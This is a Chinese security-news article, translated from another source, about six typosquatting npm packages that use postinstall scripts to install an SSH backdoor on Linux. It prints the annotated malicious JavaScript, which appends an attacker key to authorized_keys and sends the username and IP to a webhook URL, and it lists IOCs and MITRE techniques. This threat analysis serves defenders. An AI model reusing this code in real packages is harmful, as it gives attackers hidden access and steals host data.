---
title: 【供应链攻击】恶意 npm 包通过名字劫持植入 SSH 后门
url: https://www.anquanke.com/post/id/302211
source: 安全客-有思想的安全新媒体
date: 2024-11-28
fetch_date: 2025-10-06T19:12:19.717461
---

# 【供应链攻击】恶意 npm 包通过名字劫持植入 SSH 后门

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 【供应链攻击】恶意 npm 包通过名字劫持植入 SSH 后门

阅读量**54880**

发布时间 : 2024-11-27 10:25:21

**x**

##### 译文声明

本文是翻译文章，文章来源：CN-SEC

原文地址：<https://cn-sec.com/archives/3441930.html>

译文仅供参考，具体内容表达以及含义原文为准。

Socket 的威胁研究团队检测到六个由威胁行为者 “sanchezjosephine180” 发布的恶意 npm 包。这些包通过“名字劫持”（typosquatting）技术模仿了开发者社区中极为流行的库。这些目标库包括 `babel-cli`、`chokidar`、`streamsearch`、`ssh2`、`npm-run-all` 和 `node-pty`，它们总下载量达数千万次，是开发者社区不可或缺的一部分。

这些恶意包分别是 `babelcl`、`chokader`、`streamserch`、`sss2h`、`npmrunnall` 和 `node-pyt`。这些包通过向 Linux 系统注入后门代码，允许威胁行为者通过 SSH 获得未经授权的访问权限。目前，这些恶意包仍然在线，总下载量已超过 700 次。我们已向 npm 官方请求下架这些包。

![【供应链攻击】恶意 npm 包通过名字劫持植入 SSH 后门]( "【供应链攻击】恶意 npm 包通过名字劫持植入 SSH 后门")

Socket AI 扫描器检测到的名字劫持和恶意 “streamserch” 包

威胁行为者利用开发者常见的输入错误，并滥用 `postinstall` 脚本分发恶意代码，目的是攻击开发者和相关组织。`postinstall` 脚本在包安装后会自动执行。它先运行 `node app.js`，然后安装一个合法的库（例如 `npm install streamsearch`），从而掩盖恶意行为。这样一来，合法功能得以呈现，降低了恶意代码被及时发现的可能性。

# 影响范围

未经授权的 SSH 访问就像在坚固的城堡墙上开了一个隐秘的门。攻击者可以悄无声息地进入，绕过安全措施，在系统内部自由行动，窃取情报，甚至可能危及整个网络的安全。在暗网上，SSH 访问凭据的交易十分活跃，威胁行为者利用这些凭据实施网络攻击和欺诈行为。安全研究人员已记录到攻击者使用 SSH 访问从事间谍活动、非法加密货币挖矿，甚至将其作为勒索软件攻击的入口。一个未经授权的 SSH 密钥不仅打开了一扇门，更为攻击者创建了一条隐蔽的通道，可以轻松渗透并威胁整个组织的数字安全堡垒。

![【供应链攻击】恶意 npm 包通过名字劫持植入 SSH 后门]( "【供应链攻击】恶意 npm 包通过名字劫持植入 SSH 后门")

威胁行为者在地下论坛 Exploit 上出售 SSH 访问权限

![【供应链攻击】恶意 npm 包通过名字劫持植入 SSH 后门]( "【供应链攻击】恶意 npm 包通过名字劫持植入 SSH 后门")

专门出售 SSH 访问权限的暗网商店

# SSH 后门代码

恶意包中的脚本允许威胁行为者通过 SSH 访问受害者系统，暴露敏感信息（如用户名和 IP 地址），并为进一步的恶意活动建立桥头堡。以下是威胁行为者的代码（已去除关键威胁部分并添加注释，以解释恶意功能）：

```
const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');

// 获取当前用户的用户名
const username = os.userInfo().username;

// 获取机器的公网 IP 地址
function getPublicIP() {
    return new Promise((resolve, reject) => {
        https.get('https://ipinfo[.]io/ip', (res) => {
            let data = '';
            res.on('data', chunk => {
                data += chunk;
            });
            res.on('end', () => {
                resolve(data.trim());
            });
        }).on('error', (err) => {
            reject(err);
        });
    });
}

// 硬编码的攻击者 SSH 公钥
const publicKey = `ssh-rsa AAAAB3NzaC...`;

// 添加攻击者 SSH 密钥到受害者的 `authorized_keys` 文件中
async function addSSHKey() {
    if (os.platform() === 'linux') {
        try {
            const ipAddress = await getPublicIP();
            const fullPublicKey = `${publicKey} ${username}@${ipAddress}`;
            const sshDir = path.join(os.homedir(), '.ssh');
            const authorizedKeysPath = path.join(sshDir, 'authorized_keys');

            if (!fs.existsSync(sshDir)) {
                fs.mkdirSync(sshDir, { mode: 0o700 });
            }

            if (fs.existsSync(authorizedKeysPath)) {
                fs.appendFileSync(authorizedKeysPath, `n${fullPublicKey}n`);
            } else {
                fs.writeFileSync(authorizedKeysPath, `${fullPublicKey}n`, { mode: 0o600 });
            }

            https.get(`https://webhook-test[.]com/8caf20007640ce1a4d2843af7b479eb1?data=I:${ipAddress}&M:${username}`, () => {});
        } catch (err) {}
    }
}

addSSHKey();
```

此恶意脚本在 `authorized_keys` 文件中添加攻击者的 SSH 密钥，从而授予攻击者系统访问权限，同时通过远程服务器发送用户名和公网 IP 地址，实现数据外泄。脚本静默运行，安装包时自动执行，极难察觉。

![【供应链攻击】恶意 npm 包通过名字劫持植入 SSH 后门]( "【供应链攻击】恶意 npm 包通过名字劫持植入 SSH 后门")

Socket AI 扫描器对恶意 “sss2h” 包的描述

# 命令与控制 (C2)

攻击者通过接收用户名和 IP 地址得知恶意脚本已成功在受害者机器上运行。这些信息帮助攻击者标识受感染的系统，并使用注入的 SSH 密钥建立连接。攻击者利用看似正常的 HTTPS 请求（例如 webhook-test.com）规避基本的网络安全措施。这种服务允许生成独特的 URL 用于接收 HTTP/S 请求，在此案例中则被用于收集受害者数据，同时隐藏攻击者的服务器或 IP 地址，增加追踪难度。

# 第七个包

除上述六个恶意包外，还有一个名为 `parimiko` 的包，它模仿了 Python 的流行 SSH 库 `paramiko`。尽管 `parimiko` 当前没有恶意代码，但威胁行为者可能利用它打造合法的假象，为后续分发恶意代码做准备。一旦该包积累了足够多的安装量，未来可能通过更新注入恶意代码。

# 展望与结论

此次发现表明，软件供应链的安全漏洞问题日益严重。开发者和组织需要高度警惕，加强依赖管理和安全审查。利用像 Socket 提供的实时威胁检测工具，可以帮助防范此类供应链攻击。

# MITRE ATT&CK

* T1195.002 — 供应链妥协：软件供应链攻击
* T1036.005 — 冒充：模仿合法名称或位置
* T1059.007 — 命令和脚本解释器：JavaScript
* T1021.004 — 远程服务：SSH
* T1190 — 利用公开服务漏洞
* T1005 — 从本地系统获取数据
* T1567.004 — 通过 Web 服务外泄：利用 Webhook

# 威胁指标 (IOCs)

* **恶意包**:

  + `babelcl`
  + `chokader`
  + `streamserch`
  + `sss2h`
  + `npmrunnall`
  + `node-pyt`
* **命令与控制服务器**:

  + `https://webhook-test[.]com/8caf20007640ce1a4d2843af7b479eb1`

本文翻译自CN-SEC [原文链接](https://cn-sec.com/archives/3441930.html)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/302211](/post/id/302211)

安全KER - 有思想的安全新媒体

本文转载自: [CN-SEC](https://cn-sec.com/archives/3441930.html)

如若转载,请注明出处： <https://cn-sec.com/archives/3441930.html>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [漏洞](/tag/%E6%BC%8F%E6%B4%9E)
* [漏洞情报](/tag/%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5)

**+1**0赞

收藏

![](https://p5.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p5.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p5.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=173683)

[安全客](/member.html?memberId=173683)

这个人太懒了，签名都懒得写一个

* 文章
* **553**

* 粉丝
* **2**

### TA的文章

* ##### [年度盘点：AI+安全双重赋能，360解锁企业浏览器新动力](/post/id/303791)

  2025-01-24 10:00:53
* ##### [IntelBroker 的数字足迹： OSINT 分析揭露网络犯罪分子的行动](/post/id/303788)

  2025-01-24 09:55:58
* ##### [7-Zip 修复了可绕过 Windows MoTW 安全警告的错误，立即修补](/post/id/303776)

  2025-01-24 09:49:56
* ##### [Microsoft 在 Edge Stable 中预览 Game Assist 游戏内浏览器](/post/id/303773)

  2025-01-24 09:43:16
* ##### [ModiLoader 恶意软件利用 CAB 标头批处理文件逃避检测](/post/id/303770)

  2025-01-24 09:36:10

### 相关文章

* ##### [Apache Airflow 存在权限漏洞，可导致只读用户获取敏感信息](/post/id/312457)

  2025-09-29 18:05:56
* ##### [Formbricks 存在高危漏洞 (CVE-2025-59934)，攻击者可通过伪造JWT令牌导致未授权的密码重置](/post/id/312451)

  2025-09-29 18:05:05
* ##### [Notepad++ 中存在DLL劫持漏洞（CVE-2025-56383），可导致任意代码执行，且POC已公开](/post/id/312448)

  2025-09-29 18:04:33
* ##### [CISA称黑客利用GeoServer漏洞成功入侵一联邦机构](/post/id/312347)

  2025-09-24 16:45:06
* ##### [SolarWinds紧急发布补丁，修复高危远程代码执行漏洞CVE-2025-26399](/post/id/312357)

  2025-09-24 16:43:11
* ##### [Chrome浏览器存在高危漏洞，可致攻击者窃取敏感信息并引发系统崩溃](/post/id/312366)

  2025-09-24 16:42:08
* ##### [CVE-2025-55241：CVSS评分10.0的Microsoft Entra ID漏洞可能危及全球所有租户](/post/id/312294)

  2025-09-22 18:14:51

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)